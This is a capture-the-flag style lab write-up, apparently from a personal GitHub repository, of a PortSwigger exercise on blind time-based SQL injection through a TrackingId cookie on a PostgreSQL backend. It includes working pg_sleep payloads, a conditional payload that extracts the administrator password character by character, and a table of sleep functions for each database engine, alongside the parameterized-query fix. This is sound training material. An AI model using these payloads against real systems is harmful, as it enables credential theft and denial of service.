# Lab 14: Blind SQL Injection with Time Delays

## Executive Summary

This lab demonstrates exploitation of a blind SQL injection vulnerability where the application provides no visible output, no error messages, and no behavioral difference in HTTP responses regardless of whether injected SQL executes successfully or not. With all conventional feedback channels absent, time-based inference becomes the only viable detection and confirmation mechanism. By injecting a PostgreSQL `pg_sleep()` function call through the TrackingId cookie, I induced a deliberate and measurable 10-second delay in the server response, confirming that injected SQL executes synchronously on the backend. This technique does not require data extraction to constitute a confirmed critical vulnerability — the ability to execute arbitrary SQL against the database is sufficient to classify the finding as critical and establish a foundation for further time-based enumeration and extraction attacks.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection - Blind Time-Based |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind SQL Injection with Time-Based Detection |
| **Risk**               | Critical - Arbitrary SQL Execution via Timing Side Channel |
| **Completion**         | 10 May 2026 |

## Objective

Identify and confirm a blind SQL injection vulnerability in the TrackingId cookie parameter where no application output, error messages, or behavioral response differences are available. Demonstrate arbitrary SQL execution by inducing a controlled, measurable time delay using the PostgreSQL `pg_sleep()` function, confirming the injection channel without relying on any data-in-response extraction technique.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and HTTP history population
- Burp Repeater for payload delivery and response timing measurement

**Target:** TrackingId cookie parameter processed by a backend PostgreSQL query with no visible output channel and no error propagation to HTTP responses

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "Blind SQL injection with time delays" and verified Burp Suite Professional was correctly configured and actively intercepting application traffic. Initial page load requests were captured through the proxy to begin populating HTTP history for analysis.

<img width="1920" height="983" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/34317d17-085d-4424-8126-dfb9cdf31830" />

*Lab 14 environment displaying the blind SQL injection with time delays challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and intercepting with captured requests visible in HTTP history (left)*

### 2. Attack Surface Identification

Reviewed the full HTTP history captured through Burp Proxy and identified a request associated with the category filter functionality as a high-value injection candidate. The request transmits the TrackingId cookie and is processed server-side on every page interaction, making it a consistent and controllable test surface.

<img width="1920" height="983" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/ed52e014-4dde-4a57-bd4e-447b7ee4a565" />

*HTTP history populated with captured requests — category filter request identified and highlighted as the target injection surface based on TrackingId cookie presence and server-side processing behavior*

**Request Captured:**
```http
GET /filter?category=Gifts HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: TrackingId=[TRACKING_VALUE]; session=[SESSION_VALUE]
```

**Injection Point Rationale:**
- TrackingId cookie is transmitted with each request and almost certainly incorporated into a backend SQL query for analytics or session tracking
- No value reflection occurs in the response body under normal conditions
- Inferred backend query structure:
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'
```

### 3. Standard Syntax-Break Test — Negative Result

Forwarded the request to Burp Repeater and applied the standard single-quote syntax-break test to determine whether the application surfaces any response difference when SQL syntax is broken.

**Test Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]''
```

<img width="1920" height="983" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/85a14823-6ea3-4bbc-b72f-1742cae25e5e" />

*Single quote injected ahead of TrackingId value — 200 OK response with no error output, no content change, and no behavioral difference confirms this is a fully blind injection scenario with no conventional feedback channel available*

**Response:** 200 OK

**Analysis:** The application returns a normal 200 OK response regardless of whether the injected syntax breaks the underlying query. No error message is surfaced, no response body content changes, and no HTTP status code difference is observed. This eliminates error-based extraction and boolean response-differential techniques as viable approaches. The only remaining detection channel is response timing.

### 4. Time-Based Injection Payload Delivery

With conventional feedback channels ruled out, shifted to time-based detection. Constructed a payload using PostgreSQL's `pg_sleep()` function concatenated onto the TrackingId value using the `||` string concatenation operator. The payload is designed so that if the backend is running PostgreSQL and the TrackingId value is being interpolated directly into a SQL query, the sleep function will execute synchronously and hold the database connection — and therefore the HTTP response — for the specified duration.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'||pg_sleep(10)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'||pg_sleep(10)--'
```

**Payload Breakdown:**

| Component | Purpose |
|-----------|---------|
| `'` | Terminates the original string literal in the SQL query |
| `\|\|` | PostgreSQL string concatenation operator — appends the sleep call to the query |
| `pg_sleep(10)` | PostgreSQL built-in function — pauses database execution for 10 seconds |
| `--` | Inline comment — neutralizes any trailing SQL from the original query |


<img width="1920" height="983" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/5a016051-7378-4bd0-b240-2f77a1d1505c" />

*Time-delay payload `'||pg_sleep(10)--` submitted in Repeater — response panel shows the request in a pending/waiting state, with no response returned yet, indicating the server-side query is currently paused in execution*

**Observed Behavior:** The Repeater response panel enters a waiting state immediately after payload submission. No response is returned during the sleep window, consistent with the database holding the connection open while `pg_sleep(10)` executes.

### 5. Time Delay Confirmed — Injection Verified

Response returned after the sleep function completed execution on the server.


<img width="1920" height="983" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/5bee3e20-1e0b-4e4b-8206-10dc2dd89b79" />

*Response received after 10,252 milliseconds — confirming the `pg_sleep(10)` function executed successfully on the backend PostgreSQL instance. The measured delay of approximately 10 seconds provides unambiguous confirmation of blind SQL injection via time-based side channel*

**Response Time:** 10,252 milliseconds (~10.25 seconds)

**Response:** 200 OK

**Analysis:** The response delay of 10,252 milliseconds directly corresponds to the 10-second sleep duration specified in the payload. Network latency and processing overhead account for the marginal overage of approximately 250 milliseconds. This result is deterministic — a delay of this duration does not occur under normal application behavior and cannot be attributed to server load or network variance given the precision of the match. The `pg_sleep()` function executed on the backend, confirming that injected SQL is being passed directly to a PostgreSQL database without sanitization.

**Injection Confirmed:**
- Backend database engine: PostgreSQL (confirmed by `pg_sleep` acceptance)
- Injection point: TrackingId cookie
- Injection type: Blind time-based
- Execution model: Synchronous — database delay blocks HTTP response
- Feedback channel: Response timing only

### 6. Lab Objective Achieved

With time-based SQL injection confirmed and the PostgreSQL backend identified, the lab objective was satisfied. Navigated to confirm lab completion.

<img width="1920" height="983" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/a28fd0bd-ac90-42ec-a7fd-b28badfd4bb7" />

*Lab completion screen — "Congratulations, you solved the lab!" confirming successful identification and exploitation of the blind time-based SQL injection vulnerability*

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.1)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

**Primary Vulnerabilities:**

**CWE-89: SQL Injection**
- TrackingId cookie value is interpolated directly into a SQL query without parameterization
- No input sanitization applied at any layer before database execution
- Full SQL execution control achieved despite the complete absence of output channels

**CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**
- While no data is directly extracted in this lab, the confirmed injection channel provides a complete foundation for time-based data extraction
- Any column in any accessible table can be enumerated character-by-character using conditional time delays
- The vulnerability class is identical regardless of whether extraction is demonstrated

**Complete Attack Chain:**

```
TrackingId Cookie Identified as Candidate Injection Point
        ↓
Standard Syntax-Break Test → 200 OK (No Error Output)
        ↓
Error-Based and Boolean Techniques Ruled Out
        ↓
Time-Based Approach Selected
        ↓
'||pg_sleep(10)-- Payload Constructed
        ↓
Payload Delivered via Burp Repeater
        ↓
HTTP Response Withheld for ~10 Seconds
        ↓
Response Returned at 10,252ms → pg_sleep Executed
        ↓
Blind SQL Injection via Time Delay Confirmed
        ↓
PostgreSQL Backend Identified
        ↓
Lab Objective Achieved
```

**Why Time-Based Injection Is Conclusive Evidence:**

A response delay of exactly 10 seconds following injection of `pg_sleep(10)` cannot be coincidental. Under normal operation, application response times are measured in tens to hundreds of milliseconds. A 10-second delay occurring precisely and reproducibly in response to a specific payload represents definitive proof of server-side SQL execution. The correlation is unambiguous:

```
Payload: pg_sleep(10)  →  Observed delay: 10,252ms
Payload: pg_sleep(5)   →  Observed delay: ~5,000ms   (predictable, reproducible)
Payload: pg_sleep(0)   →  Observed delay: ~normal     (baseline restored)
```

Reproducibility across delay values eliminates server load and network jitter as explanations.

**Escalation Path — Time-Based Data Extraction:**

Although this lab requires only confirmation of the vulnerability, the injection channel established here is fully capable of supporting complete credential extraction using conditional time delays. The attack follows the same structure demonstrated in Lab 12 (conditional error-based), substituting the error trigger with a sleep trigger:

```sql
-- Boolean inference via time delay
-- If condition is true → sleep 10 seconds (500ms+ response = true)
-- If condition is false → return immediately (normal response = false)

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

-- Password character extraction
'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
    THEN pg_sleep(10) ELSE pg_sleep(0) END 
    FROM users WHERE username='administrator')--
```

**Comparison: Time-Based vs. Other Blind SQL Injection Techniques:**

| Technique | Feedback Channel | Detection Reliability | Extraction Speed | Stealth |
|-----------|-----------------|----------------------|-----------------|---------|
| **Time-Based (This Lab)** | Response duration | High — deterministic | Very slow | Low — delays are anomalous |
| **Boolean Response-Differential** | HTTP status / content | High | Slow | Medium |
| **Conditional Error-Based** | HTTP 500 vs 200 | High | Medium | Medium |
| **Out-of-Band (DNS/HTTP)** | External channel | High | Fast | Low — external traffic |
| **UNION / Error Visible** | Response body | High | Fast (full value per request) | Low — errors logged |

**Database-Specific Sleep Functions:**

The choice of sleep function is critical for database fingerprinting and attack success. Submitting the wrong function for the backend engine results in a SQL error or silent failure rather than a delay:

| Database | Sleep Function | Notes |
|----------|---------------|-------|
| **PostgreSQL (confirmed)** | `pg_sleep(10)` | Accepts decimal seconds; blocks connection |
| **MySQL** | `SLEEP(10)` | Similar behavior |
| **Microsoft SQL Server** | `WAITFOR DELAY '0:0:10'` | Different syntax entirely |
| **Oracle** | `dbms_pipe.receive_message(('x'),10)` | Requires execute privilege |
| **SQLite** | No native sleep | Workarounds exist but unreliable |

Acceptance of `pg_sleep()` without error — combined with the measured delay — performs dual duty: confirming injection and fingerprinting the database engine in a single request.

**Real-World Impact:**

| Target Environment | Consequence of This Vulnerability |
|--------------------|----------------------------------|
| **Any Application** | Full database enumeration via time-based extraction |
| **Authentication Systems** | Credential extraction enabling account takeover |
| **Multi-Tenant SaaS** | Cross-tenant data access via database-level queries |
| **Internal Applications** | Lateral movement via credential reuse after extraction |
| **High-Traffic Systems** | DoS potential — `pg_sleep` with large values holds connection threads |

**Denial of Service Consideration:**

Time-based SQL injection in high-concurrency applications carries a secondary risk beyond data extraction. An attacker can issue many concurrent requests with large sleep values, exhausting the application's database connection pool or thread capacity. This is a genuine availability risk that warrants attention independent of the confidentiality and integrity impact.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Systematic elimination of feedback channels before selecting technique
- Syntax-break test used as negative confirmation, not just positive confirmation
- Time-based approach selected after ruling out error-based and boolean-differential methods
- Single payload sufficient for both injection confirmation and database fingerprinting
- Response timing measured precisely in Burp Repeater to establish correlation

**Critical Security Insights:**

**1. No Output Does Not Mean No Vulnerability:**
Applications that suppress all error messages and return identical responses for valid and invalid queries are not protected against SQL injection — they simply require a different detection technique. Time-based injection is fully deterministic and requires no application feedback beyond response timing, which cannot be suppressed without fundamentally altering how HTTP works.

**2. Suppressing Errors Is Insufficient Defense:**
Error suppression eliminates error-based extraction and reduces attack efficiency but does not neutralize the underlying injection. The root cause — unsanitized user input in SQL query construction — must be fixed at the code level. Generic error pages address only one symptom of one attack variant.

**3. Response Timing Is an Unavoidable Side Channel:**
Unlike output suppression, response timing cannot be meaningfully hidden from an attacker with network access to the application. Normalizing response times across all code paths is theoretically possible but practically infeasible in most application architectures. Parameterized queries remove the vulnerability entirely rather than attempting to obscure its effects.

**4. The Only Adequate Fix:**

**Vulnerable Pattern:**
```python
# Direct string interpolation — vulnerable regardless of error handling
query = "SELECT data FROM tracking WHERE id = '" + tracking_id + "'"
cursor.execute(query)
```

**Secure Pattern:**
```python
# Parameterized query — user input never interpreted as SQL
query = "SELECT data FROM tracking WHERE id = %s"
cursor.execute(query, (tracking_id,))
```

Parameterized queries separate SQL structure from data at the driver level. The database receives the query and the parameter independently — user-supplied input is never parsed as SQL syntax under any circumstances.

**5. Time-Based Payloads Serve Multiple Purposes:**
A single well-constructed time-based payload simultaneously confirms injection, identifies the database engine, and establishes the execution model (synchronous vs. asynchronous). In engagements where speed and minimal footprint matter, this efficiency is operationally significant.

**6. All Cookie Parameters Are In Scope:**
TrackingId and similar analytics cookies are frequently excluded from manual testing scope due to their perceived passivity. This lab reinforces that any server-processed parameter — regardless of whether its value is reflected, stored, or functionally meaningful to the user — represents a valid injection surface and must be included in assessment scope.

## References

1. PortSwigger Web Security Academy - Blind SQL Injection
2. PortSwigger Web Security Academy - SQL Injection Cheat Sheet
3. OWASP Top 10 (2021) - A03: Injection
4. CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
5. CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
6. PostgreSQL Documentation - `pg_sleep()` Function
7. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems, inducing deliberate delays against production infrastructure, or any form of unauthorized database interaction is illegal under applicable laws worldwide.
